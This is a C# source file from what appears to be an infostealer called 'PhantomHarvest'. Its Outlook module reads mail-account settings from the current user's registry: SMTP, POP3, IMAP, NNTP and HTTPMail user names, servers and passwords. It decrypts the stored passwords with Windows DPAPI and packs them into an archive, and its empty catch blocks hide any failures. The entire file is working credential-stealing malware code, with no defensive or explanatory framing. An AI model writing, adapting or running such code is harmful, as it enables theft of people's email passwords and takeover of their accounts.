using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Mails
{
	internal class Outlook
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string outlook = Outlook.GrabOutlook();
				if (!string.IsNullOrEmpty(outlook))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(outlook)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, Outlook.MailName + "/Outlook.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string GrabOutlook()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] array = new string[]
			{
				"Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
				"Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
			};
			string[] clients = new string[]
			{
				"SMTP Email Address",
				"SMTP Server",
				"POP3 Server",
				"POP3 User Name",
				"SMTP User Name",
				"NNTP Email Address",
				"NNTP User Name",
				"NNTP Server",
				"IMAP Server",
				"IMAP User Name",
				"Email",
				"HTTP User",
				"HTTP Server URL",
				"POP3 User",
				"IMAP User",
				"HTTPMail User Name",
				"HTTPMail Server",
				"SMTP User",
				"POP3 Password2",
				"IMAP Password2",
				"NNTP Password2",
				"HTTPMail Password2",
				"SMTP Password2",
				"POP3 Password",
				"IMAP Password",
				"NNTP Password",
				"HTTPMail Password",
				"SMTP Password"
			};
			foreach (string path in array)
			{
				stringBuilder.Append(Outlook.Get(path, clients));
			}
			return stringBuilder.ToString();
		}

		private static string Get(string path, string[] clients)
		{
			StringBuilder stringBuilder = new StringBuilder();
			try
			{
				foreach (string text in clients)
				{
					try
					{
						object infoFromRegistry = Outlook.GetInfoFromRegistry(path, text);
						if (infoFromRegistry != null)
						{
							if (text.Contains("Password") && !text.Contains("2"))
							{
								stringBuilder.AppendLine(text + ": " + Outlook.DecryptValue((byte[])infoFromRegistry));
							}
							else if (Outlook.smptClient.IsMatch(infoFromRegistry.ToString()) || Outlook.mailClient.IsMatch(infoFromRegistry.ToString()))
							{
								stringBuilder.AppendLine(string.Format("{0}: {1}", text, infoFromRegistry));
							}
							else
							{
								stringBuilder.AppendLine(text + ": " + Encoding.UTF8.GetString((byte[])infoFromRegistry).Replace(Convert.ToChar(0).ToString(), ""));
							}
						}
					}
					catch
					{
					}
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey != null)
				{
					foreach (string str in registryKey.GetSubKeyNames())
					{
						stringBuilder.Append(Outlook.Get(path + "\\" + str, clients) ?? "");
					}
				}
			}
			catch
			{
			}
			return stringBuilder.ToString();
		}

		private static object GetInfoFromRegistry(string path, string valueName)
		{
			object result = null;
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
				if (registryKey == null)
				{
					return null;
				}
				result = registryKey.GetValue(valueName);
				registryKey.Close();
			}
			catch
			{
			}
			return result;
		}

		private static string DecryptValue(byte[] encrypted)
		{
			try
			{
				byte[] array = new byte[encrypted.Length - 1];
				Buffer.BlockCopy(encrypted, 1, array, 0, encrypted.Length - 1);
				return Encoding.UTF8.GetString(ProtectedData.Unprotect(array, null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
			}
			catch
			{
			}
			return "null";
		}

		public static string MailName = "Outlook";

		private static Regex mailClient = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");

		private static Regex smptClient = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
	}
}
